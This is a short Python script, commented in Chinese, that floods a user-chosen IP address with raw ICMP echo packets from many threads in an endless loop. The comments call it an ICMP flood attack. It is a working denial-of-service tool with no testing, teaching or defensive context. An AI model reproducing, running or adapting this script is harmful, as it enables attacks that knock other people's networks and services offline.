import os
import socket
import threading

# 发送 ICMP 请求
def icmp_flood(target_ip, thread_id):
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.getprotobyname("icmp"))
    while True:
        sock.sendto(b'\x08\x00\x00\x00\x00\x00\x00\x00', (target_ip, 0))
        print(f"[线程 {thread_id}] 发送 ICMP 请求到 {target_ip}")

# 获取用户输入
def get_user_input():
    target_ip = input("请输入目标 IP     : ")
    threads = int(input("请输入线程数      : "))
    return target_ip, threads

# 启动 ICMP Flood 攻击
def start_icmp_flood():
    target_ip, threads = get_user_input()
    for i in range(threads):
        threading.Thread(target=icmp_flood, args=(target_ip, i+1)).start()

if __name__ == "__main__":
    start_icmp_flood()
